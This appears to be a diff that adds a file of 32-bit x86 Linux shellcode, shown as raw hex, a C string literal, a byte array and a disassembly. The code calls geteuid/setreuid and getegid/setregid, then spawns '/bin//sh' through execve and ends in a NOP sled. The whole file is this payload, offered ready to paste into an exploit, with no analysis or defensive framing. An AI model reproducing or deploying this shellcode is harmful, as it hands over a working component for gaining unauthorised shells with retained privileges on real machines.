@@ -1,0 +1,60 @@
+Disassembly
+Raw Hex (zero bytes in bold):
+
+B9FFFFFFFF31C0B031CD8089C331C0B046CD8031C0B032CD8089C3B031B047CD8031C031D252682F2F7368682F62696E89E3525389E1B00BCD8031C040CD80909090909090909090909090   
+
+String Literal:
+
+"\xB9\xFF\xFF\xFF\xFF\x31\xC0\xB0\x31\xCD\x80\x89\xC3\x31\xC0\xB0\x46\xCD\x80\x31\xC0\xB0\x32\xCD\x80\x89\xC3\xB0\x31\xB0\x47\xCD\x80\x31\xC0\x31\xD2\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x52\x53\x89\xE1\xB0\x0B\xCD\x80\x31\xC0\x40\xCD\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+
+Array Literal:
+
+{ 0xB9, 0xFF, 0xFF, 0xFF, 0xFF, 0x31, 0xC0, 0xB0, 0x31, 0xCD, 0x80, 0x89, 0xC3, 0x31, 0xC0, 0xB0, 0x46, 0xCD, 0x80, 0x31, 0xC0, 0xB0, 0x32, 0xCD, 0x80, 0x89, 0xC3, 0xB0, 0x31, 0xB0, 0x47, 0xCD, 0x80, 0x31, 0xC0, 0x31, 0xD2, 0x52, 0x68, 0x2F, 0x2F, 0x73, 0x68, 0x68, 0x2F, 0x62, 0x69, 0x6E, 0x89, 0xE3, 0x52, 0x53, 0x89, 0xE1, 0xB0, 0x0B, 0xCD, 0x80, 0x31, 0xC0, 0x40, 0xCD, 0x80, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 }
+
+
+///////////////////////////////////////////////////////////////////////
+
+Disassembly:
+0:  b9 ff ff ff ff          mov    ecx,0xffffffff
+5:  31 c0                   xor    eax,eax
+7:  b0 31                   mov    al,0x31
+9:  cd 80                   int    0x80
+b:  89 c3                   mov    ebx,eax
+d:  31 c0                   xor    eax,eax
+f:  b0 46                   mov    al,0x46
+11: cd 80                   int    0x80
+13: 31 c0                   xor    eax,eax
+15: b0 32                   mov    al,0x32
+17: cd 80                   int    0x80
+19: 89 c3                   mov    ebx,eax
+1b: b0 31                   mov    al,0x31
+1d: b0 47                   mov    al,0x47
+1f: cd 80                   int    0x80
+21: 31 c0                   xor    eax,eax
+23: 31 d2                   xor    edx,edx
+25: 52                      push   edx
+26: 68 2f 2f 73 68          push   0x68732f2f
+2b: 68 2f 62 69 6e          push   0x6e69622f
+30: 89 e3                   mov    ebx,esp
+32: 52                      push   edx
+33: 53                      push   ebx
+34: 89 e1                   mov    ecx,esp
+36: b0 0b                   mov    al,0xb
+38: cd 80                   int    0x80
+3a: 31 c0                   xor    eax,eax
+3c: 40                      inc    eax
+3d: cd 80                   int    0x80
+3f: 90                      nop
+40: 90                      nop
+41: 90                      nop
+42: 90                      nop
+43: 90                      nop
+44: 90                      nop
+45: 90                      nop
+46: 90                      nop
+47: 90                      nop
+48: 90                      nop
+49: 90                      nop
+4a: 90                      nop
+
+////////////////////////////////////////////////////////////////////////
